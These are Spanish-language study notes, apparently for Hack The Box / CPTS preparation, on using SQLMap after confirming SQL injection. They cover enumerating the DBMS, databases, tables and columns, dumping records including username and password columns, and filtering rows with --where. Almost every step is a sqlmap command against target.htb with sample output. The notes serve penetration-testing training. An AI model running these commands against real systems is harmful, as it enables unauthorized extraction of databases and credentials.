
## 1. Enumeración de bases de datos

Una vez identificada y confirmada una vulnerabilidad **SQL Injection**, podemos utilizar SQLMap para enumerar la base de datos y recuperar información.

SQLMap dispone de consultas SQL predefinidas para diferentes gestores de bases de datos (DBMS), como MySQL.

Por ejemplo, en MySQL utiliza:

|Información|Consulta SQL|
|---|---|
|Versión del DBMS|`VERSION()`|
|Usuario actual|`CURRENT_USER()`|
|Base de datos actual|`DATABASE()`|
|Hostname|`@@HOSTNAME`|
|Usuarios de la BD|`SELECT user FROM mysql.user`|

SQLMap selecciona las consultas apropiadas según el DBMS detectado y la técnica SQLi disponible.

### Técnicas de extracción

**In-band (UNION / Error-based):**

- Los resultados pueden recuperarse directamente de las respuestas HTTP.
    
- Generalmente permite una extracción más rápida.
    

**Blind SQL Injection:**

- La información se recupera mediante inferencias sobre las respuestas.
    
- Puede requerir extraer los datos fila por fila, columna por columna y bit por bit.
    
- Generalmente es más lenta.

## 2. Enumeración básica del DBMS

Después de confirmar una SQL Injection, comenzamos obteniendo información básica sobre la base de datos.

### Obtener información del sistema

```
sqlmap -u 'http://target.htb/?id=1' \
--banner \
--current-user \
--current-db \
--is-dba
```

|Parámetro|Función|
|---|---|
|`--banner`|Obtener la versión del DBMS|
|`--current-user`|Mostrar el usuario actual de la BD|
|`--current-db`|Mostrar la base de datos actual|
|`--is-dba`|Comprobar si el usuario tiene privilegios DBA|
|`--hostname`|Obtener el hostname del servidor|
|`--passwords`|Intentar recuperar hashes de contraseñas de usuarios del DBMS|

Ejemplo de resultado:

```
back-end DBMS: MySQL >= 5.0

banner: '5.1.41-3~bpo50+1'

current user: 'root@%'

current database: 'testdb'

current user is DBA: True
```

Esto indica que:

- El DBMS es MySQL.
    
- El usuario actual es `root@%`.
    
- La base de datos actual es `testdb`.
    
- El usuario tiene privilegios DBA.
    

**Importante:** el usuario `root` de MySQL no equivale necesariamente al usuario `root` del sistema operativo.

Los privilegios dentro de la base de datos y los permisos del sistema operativo son independientes.

### Reutilización de sesiones

Cuando SQLMap ya ha identificado una vulnerabilidad, guarda información sobre ella.

En ejecuciones posteriores puede recuperar los puntos de inyección detectados previamente y continuar directamente con la enumeración.

## 3. Enumerar bases de datos

Para listar las bases de datos disponibles utilizamos:

```
sqlmap -u 'http://target.htb/?id=1' --dbs
```

Ejemplo:

```
available databases [4]:

[*] information_schema
[*] mysql
[*] performance_schema
[*] testdb
```

Una vez identificada una base de datos interesante, podemos enumerar sus tablas.

---

## 4. Enumerar tablas

Para obtener las tablas de una base de datos utilizamos:

```
sqlmap -u 'http://target.htb/?id=1' \
-D testdb \
--tables
```

Donde:

- `-D testdb`: selecciona la base de datos.
    
- `--tables`: enumera sus tablas.
    

Ejemplo:

```
Database: testdb

[4 tables]

+---------------+
| member        |
| data          |
| international |
| users         |
+---------------+
```

Ahora sabemos que existe una tabla llamada `users`.

---

## 5. Extraer información de una tabla

Para recuperar el contenido de una tabla utilizamos `--dump`.

```
sqlmap -u 'http://target.htb/?id=1' \
-D testdb \
-T users \
--dump
```

Donde:

- `-D`: selecciona la base de datos.
    
- `-T`: selecciona la tabla.
    
- `--dump`: recupera sus registros.
    

Ejemplo:

```
Database: testdb

Table: users

[4 entries]

+----+--------+------------+
| id | name   | surname    |
+----+--------+------------+
| 1  | luther | blisset    |
| 2  | fluffy | bunny      |
| 3  | wu     | ming       |
| 4  | NULL   | nameisnull |
+----+--------+------------+
```

SQLMap también guarda los resultados localmente.

Ejemplo:

```
~/.local/share/sqlmap/output/target.htb/dump/testdb/users.csv
```

### Formatos de exportación

Por defecto, SQLMap utiliza CSV.

Podemos modificar el formato mediante `--dump-format`.

```
sqlmap -u 'http://target.htb/?id=1' \
-D testdb \
-T users \
--dump \
--dump-format=HTML
```

También admite el formato SQLite:

```
sqlmap -u 'http://target.htb/?id=1' \
-D testdb \
-T users \
--dump \
--dump-format=SQLITE
```

---

## 6. Enumerar columnas específicas

Cuando una tabla contiene muchas columnas, podemos seleccionar únicamente las que nos interesan mediante `-C`.

Ejemplo:

```
sqlmap -u 'http://target.htb/?id=1' \
-D testdb \
-T users \
-C name,surname \
--dump
```

Resultado:

```
Database: testdb

Table: users

+--------+------------+
| name   | surname    |
+--------+------------+
| luther | blisset    |
| fluffy | bunny      |
| wu     | ming       |
| NULL   | nameisnull |
+--------+------------+
```

Esto evita recuperar columnas innecesarias.

**Útil para HTB:** cuando encontramos tablas con muchas columnas y solamente queremos recuperar campos específicos.

---

## 7. Extraer filas específicas

SQLMap permite limitar los registros recuperados mediante:

- `--start`
    
- `--stop`
    

Ejemplo:

```
sqlmap -u 'http://target.htb/?id=1' \
-D testdb \
-T users \
--dump \
--start=2 \
--stop=3
```

Resultado:

```
Database: testdb

Table: users

[2 entries]

+----+--------+---------+
| id | name   | surname |
+----+--------+---------+
| 2  | fluffy | bunny   |
| 3  | wu     | ming    |
+----+--------+---------+
```

En este ejemplo, SQLMap recupera únicamente las entradas segunda y tercera.

**Importante:** `--start` y `--stop` delimitan posiciones de extracción, no valores de una columna como `id`.

---

## 8. Enumeración condicional

Podemos recuperar únicamente los registros que cumplan una condición SQL utilizando `--where`.

Por ejemplo, queremos obtener usuarios cuyo nombre comience por `f`.

```
sqlmap -u 'http://target.htb/?id=1' \
-D testdb \
-T users \
--dump \
--where="name LIKE 'f%'"
```

Resultado:

```
Database: testdb

Table: users

[1 entry]

+----+--------+---------+
| id | name   | surname |
+----+--------+---------+
| 2  | fluffy | bunny   |
+----+--------+---------+
```

### Otros ejemplos de condiciones

**Buscar un usuario concreto:**

```
sqlmap -r req.txt \
-D testdb \
-T users \
--dump \
--where="name='admin'"
```

**Recuperar registros con ID superior a 10:**

```
sqlmap -r req.txt \
-D testdb \
-T users \
--dump \
--where="id>10"
```

**Buscar nombres que contengan** `**admin**`**:**

```
sqlmap -r req.txt \
-D testdb \
-T users \
--dump \
--where="name LIKE '%admin%'"
```

La opción `--where` resulta especialmente útil cuando las tablas contienen muchos registros.

## 9. Extraer una base de datos completa

En lugar de recuperar las tablas individualmente, podemos extraer todo el contenido de una base de datos.

### Extraer todas las tablas de una base de datos

```
sqlmap -u 'http://target.htb/?id=1' \
-D testdb \
--dump
```

Al no especificar `-T`, SQLMap recuperará el contenido de todas las tablas de `testdb`.

### Extraer la base de datos actual

```
sqlmap -u 'http://target.htb/?id=1' --dump
```

Sin indicar una base de datos ni una tabla, SQLMap intentará recuperar el contenido de la base de datos actual.

### Extraer todas las bases de datos

```
sqlmap -u 'http://target.htb/?id=1' --dump-all
```

Esto intentará recuperar el contenido de todas las bases de datos accesibles.

### Excluir bases de datos del sistema

Podemos utilizar:

```
sqlmap -u 'http://target.htb/?id=1' \
--dump-all \
--exclude-sysdbs
```

La opción `--exclude-sysdbs` evita recuperar las bases de datos del sistema.

Esto permite centrarnos en las bases de datos de la aplicación.

# 11. Metodología práctica para HTB / CPTS

## Paso 1. Confirmar la vulnerabilidad

Partimos de una petición capturada con Burp Suite:

```
sqlmap -r req.txt -p id --batch
```

## Paso 2. Obtener información básica

```
sqlmap -r req.txt -p id \
--banner \
--current-user \
--current-db \
--is-dba \
--batch
```

## Paso 3. Enumerar bases de datos

```
sqlmap -r req.txt -p id --dbs --batch
```

## Paso 4. Enumerar tablas

Supongamos que encontramos una base de datos llamada `webapp`.

```
sqlmap -r req.txt -p id \
-D webapp \
--tables \
--batch
```

## Paso 5. Enumerar columnas

Si encontramos una tabla llamada `users`:

```
sqlmap -r req.txt -p id \
-D webapp \
-T users \
--columns \
--batch
```

## Paso 6. Extraer información

Si la tabla contiene las columnas `username` y `password`:

```
sqlmap -r req.txt -p id \
-D webapp \
-T users \
-C username,password \
--dump \
--batch
```

## Paso 7. Filtrar registros

Si solamente necesitamos un usuario específico:

```
sqlmap -r req.txt -p id \
-D webapp \
-T users \
--dump \
--where="username='admin'" \
--batch
```

---

## Puntos importantes para el examen

1. `**--dbs**` permite descubrir las bases de datos disponibles.
    
2. `**-D**` selecciona una base de datos específica.
    
3. `**--tables**` enumera sus tablas.
    
4. `**-T**` selecciona una tabla.
    
5. `**--columns**` enumera las columnas.
    
6. `**-C**` permite seleccionar columnas específicas.
    
7. `**--dump**` recupera los registros.
    
8. `**--where**` permite filtrar registros mediante condiciones SQL.
    
9. `**--start**` **y** `**--stop**` permiten limitar las filas recuperadas.
    
10. `**--dump-all --exclude-sysdbs**` permite recuperar las bases de datos accesibles excluyendo las del sistema.
    

### Flujo principal que debes recordar

```
# 1. Detectar SQL Injection
sqlmap -r req.txt -p id --batch

# 2. Obtener información básica
sqlmap -r req.txt --current-user --current-db --is-dba --batch

# 3. Enumerar bases de datos
sqlmap -r req.txt --dbs --batch

# 4. Enumerar tablas
sqlmap -r req.txt -D webapp --tables --batch

# 5. Enumerar columnas
sqlmap -r req.txt -D webapp -T users --columns --batch

# 6. Extraer columnas específicas
sqlmap -r req.txt -D webapp -T users -C username,password --dump --batch

# 7. Extraer una base de datos completa
sqlmap -r req.txt -D webapp --dump --batch
```

**Idea principal:** después de confirmar una SQL Injection, el procedimiento habitual consiste en identificar el DBMS y sus privilegios, enumerar bases de datos, localizar tablas y columnas interesantes y recuperar únicamente la información necesaria.
